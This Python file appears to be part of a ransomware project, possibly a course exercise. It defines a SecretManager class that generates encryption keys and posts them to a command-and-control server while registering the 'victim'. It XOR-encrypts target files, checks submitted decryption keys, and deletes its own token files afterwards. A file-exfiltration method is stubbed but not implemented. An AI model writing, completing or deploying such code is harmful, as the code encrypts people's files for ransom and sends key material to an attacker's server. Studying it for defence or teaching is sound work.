from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import json
from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16


    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root", token_path:str="/root/token") -> None:
        self._key = None
        self._salt = None
        self._token = None

        self._token_path = token_path
        self._remote_host_port = remote_host_port
        self._path = path

        self._log = logging.getLogger(self.__class__.__name__)



    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derive a key from a salt and a key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )

        # derive the key
        return kdf.derive(key)



    def create(self)->Tuple[bytes, bytes, bytes]:
        # generate a random salt
        salt = secrets.token_bytes(self.SALT_LENGTH)

        # generate a random key
        key = secrets.token_bytes(self.KEY_LENGTH)

        # generate a token with the key and the salt
        token = self.do_derivation(salt, key)

        # return the crypto data
        return salt, key, token



    def bin_to_b64(self, data:bytes)->str:
        # convert bytes to base64
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")



    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # create dict of token, salt and key
        data = { "token": self.bin_to_b64(token), "salt": self.bin_to_b64(salt), "key": self.bin_to_b64(key)}

        # Stringify the dict (json)
        data = json.dumps(data)

        # send the data to the CNC
        response = requests.post(f"http://{self._remote_host_port}/new", data=data, headers={"Content-Type": "application/json"})

        # check if the response code is 200, if not, raise an exception
        if response.status_code != 200: raise Exception("Error while registering the victim")

        #decode the response
        response_data = response.json()

        # if the response is not OK, raise an exception, else, just return
        if response_data["status"] == "OK": return
        else: raise Exception("Error while registering the victim")



    def setup(self)->bool:
        try:        
            # Create key, salt and token
            self._salt, self._key, self._token = self.create()

            # send the salt, key and token to the CNC
            self.post_new(self._salt, self._key, self._token)

            # save the salt and token into /root/token/token.bin
            path = os.path.join(self._token_path, "token.bin")
            with open(path, "wb") as f: f.write(self._token)
            
            # save the salt and token into /root/token/salt.bin
            path = os.path.join(self._token_path, "salt.bin")
            with open(path, "wb") as f: f.write(self._salt)
        
        except Exception as e:
            self._log.error(f"Error while setting up cryptography: {e}")
            return False

        return True



    def load(self)->None:
        # function to load crypto data

        # read the salt from /root/token/salt.bin
        path = os.path.join(self._token_path, "salt.bin")
        with open(path, "rb") as f:
            salt = f.read()

        # read the token from /root/token/token.bin
        path = os.path.join(self._token_path, "token.bin")
        with open(path, "rb") as f:
            token = f.read()

        # set the salt and token
        self._salt = salt
        self._token = token
        
        return



    def check_key(self, candidate_key:bytes)->bool:

        # Generate a token with the candidate key and the salt
        theoretical_token = self.do_derivation(self._salt, candidate_key)

        # return the result if the token is the same or not
        return theoretical_token == self._token



    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting

        # convert the key from base64 to bytes
        key = base64.b64decode(b64_key)

        # check if the key is valid
        if self.check_key(key):
            self._key = key
        else:
            raise Exception("Invalid key")

        return



    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        
        # hash the token with sha256
        token = self._token.hex()

        # convert the token into a string
        token = str(token)

        # return the token
        return token
        


    def xorfiles(self, files:List[str])->None:
        # xor a list for file

        # for each file
        for file in files:
            # xor the file
            xorfile(file, self._key)


 
    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()



    def clean(self):
        # remove crypto data from the target
        try:
            # remove the token
            path = os.path.join(self._token_path, "token.bin")
            os.remove(path)
        except: pass
        
        try:
            # remove the salt
            path = os.path.join(self._token_path, "salt.bin")
            os.remove(path)
        except: pass

        # remove the directory
        try: os.rmdir(self._token_path)
        except: pass